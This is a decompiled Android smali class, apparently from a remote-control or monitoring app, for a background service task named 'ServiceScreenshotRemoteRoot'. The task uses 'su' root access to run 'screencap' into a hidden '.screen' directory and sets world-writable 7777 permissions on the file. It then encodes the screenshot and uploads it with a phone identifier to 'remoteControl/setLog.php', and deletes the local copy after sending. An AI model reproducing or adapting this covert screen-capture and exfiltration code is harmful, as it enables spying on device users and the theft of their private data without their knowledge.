.class final Lcom/app/service/ServiceScreenshotRemoteRoot$1;
.super Ljava/lang/Object;
.source "ServiceScreenshotRemoteRoot.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/app/service/ServiceScreenshotRemoteRoot;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private synthetic a:Lcom/app/service/ServiceScreenshotRemoteRoot;


# direct methods
.method constructor <init>(Lcom/app/service/ServiceScreenshotRemoteRoot;)V
    .locals 0

    .line 76
    iput-object p1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 9

    .line 80
    :try_start_0
    invoke-static {}, Ler;->a()Ljava/lang/String;

    move-result-object v6

    .line 82
    new-instance v7, Ljava/util/HashMap;

    invoke-direct {v7}, Ljava/util/HashMap;-><init>()V

    const-string v0, "idPhone"

    .line 83
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-virtual {v2}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lda;->f(Landroid/content/Context;)I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v0, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "dateConnexion"

    .line 84
    invoke-virtual {v7, v0, v6}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "idLog"

    .line 85
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-static {v2}, Lcom/app/service/ServiceScreenshotRemoteRoot;->a(Lcom/app/service/ServiceScreenshotRemoteRoot;)I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v0, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 88
    :try_start_1
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v1

    const-string v3, ".screen"

    invoke-direct {v0, v1, v3}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 90
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_0

    .line 91
    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    .line 94
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "/Screenshoot_"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ler;->c()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ".png"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 96
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const-string v4, "su"

    invoke-virtual {v3, v4, v2, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)Ljava/lang/Process;

    move-result-object v2

    .line 97
    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    .line 98
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "/system/bin/screencap -p "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v5, "/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, "ASCII"

    invoke-virtual {v4, v5}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/io/OutputStream;->write([B)V

    .line 99
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    .line 100
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    .line 101
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 105
    :try_start_2
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const-string v4, "su"

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 106
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "chmod 7777 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 107
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "chmod -R 7777 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 108
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "chown nobody:nobody "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 109
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const-string v3, "exit\n"

    .line 110
    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 111
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    .line 113
    :try_start_3
    invoke-virtual {v2}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 116
    :goto_0
    new-instance v8, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v8, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 119
    invoke-static {v8, v8}, Leq;->a(Ljava/io/File;Ljava/io/File;)V

    .line 121
    invoke-static {v8}, Ler;->a(Ljava/io/File;)[B

    move-result-object v0

    invoke-static {v0}, Lio/fabric/sdk/android/services/network/HttpRequest$a;->a([B)Ljava/lang/String;

    move-result-object v0

    const-string v1, "type"

    .line 123
    iget-object v2, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-static {v2}, Lcom/app/service/ServiceScreenshotRemoteRoot;->b(Lcom/app/service/ServiceScreenshotRemoteRoot;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v7, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "data"

    .line 124
    invoke-virtual {v7, v1, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 126
    iget-object v0, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    .line 127
    invoke-virtual {v0}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lda;->f(Landroid/content/Context;)I

    move-result v0

    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    .line 129
    invoke-static {v1}, Lcom/app/service/ServiceScreenshotRemoteRoot;->b(Lcom/app/service/ServiceScreenshotRemoteRoot;)Ljava/lang/String;

    move-result-object v2

    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    .line 130
    invoke-static {v1}, Lcom/app/service/ServiceScreenshotRemoteRoot;->a(Lcom/app/service/ServiceScreenshotRemoteRoot;)I

    move-result v3

    .line 131
    invoke-virtual {v8}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    .line 132
    invoke-virtual {v1}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    move-object v1, v6

    .line 126
    invoke-static/range {v0 .. v5}, Lu;->a(ILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Landroid/content/Context;)J

    move-result-wide v0

    const-string v2, "remoteControl/setLog.php"

    .line 134
    invoke-static {v2, v7}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v2

    if-eqz v2, :cond_1

    long-to-int v1, v0

    .line 135
    iget-object v0, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-virtual {v0}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v1, v0}, Lu;->g(ILandroid/content/Context;)Z

    .line 136
    invoke-virtual {v8}, Ljava/io/File;->delete()Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    .line 139
    :try_start_4
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    const-string v0, "type"

    .line 141
    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-static {v1}, Lcom/app/service/ServiceScreenshotRemoteRoot;->b(Lcom/app/service/ServiceScreenshotRemoteRoot;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v0, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "data"

    .line 142
    sget-object v1, Lcw;->h:Ljava/lang/String;

    invoke-virtual {v7, v0, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 144
    iget-object v0, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    .line 145
    invoke-virtual {v0}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lda;->f(Landroid/content/Context;)I

    move-result v0

    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    .line 147
    invoke-static {v1}, Lcom/app/service/ServiceScreenshotRemoteRoot;->b(Lcom/app/service/ServiceScreenshotRemoteRoot;)Ljava/lang/String;

    move-result-object v2

    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    .line 148
    invoke-static {v1}, Lcom/app/service/ServiceScreenshotRemoteRoot;->a(Lcom/app/service/ServiceScreenshotRemoteRoot;)I

    move-result v3

    sget-object v4, Lcw;->h:Ljava/lang/String;

    iget-object v1, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-virtual {v1}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    move-object v1, v6

    .line 144
    invoke-static/range {v0 .. v5}, Lu;->a(ILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Landroid/content/Context;)J

    move-result-wide v0

    const-string v2, "remoteControl/setLog.php"

    .line 150
    invoke-static {v2, v7}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v2

    if-eqz v2, :cond_1

    long-to-int v1, v0

    .line 151
    iget-object v0, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-virtual {v0}, Lcom/app/service/ServiceScreenshotRemoteRoot;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v1, v0}, Lu;->g(ILandroid/content/Context;)Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_1

    :catch_2
    move-exception v0

    .line 155
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 158
    :cond_1
    :goto_1
    iget-object v0, p0, Lcom/app/service/ServiceScreenshotRemoteRoot$1;->a:Lcom/app/service/ServiceScreenshotRemoteRoot;

    invoke-virtual {v0}, Lcom/app/service/ServiceScreenshotRemoteRoot;->stopSelf()V

    return-void
.end method
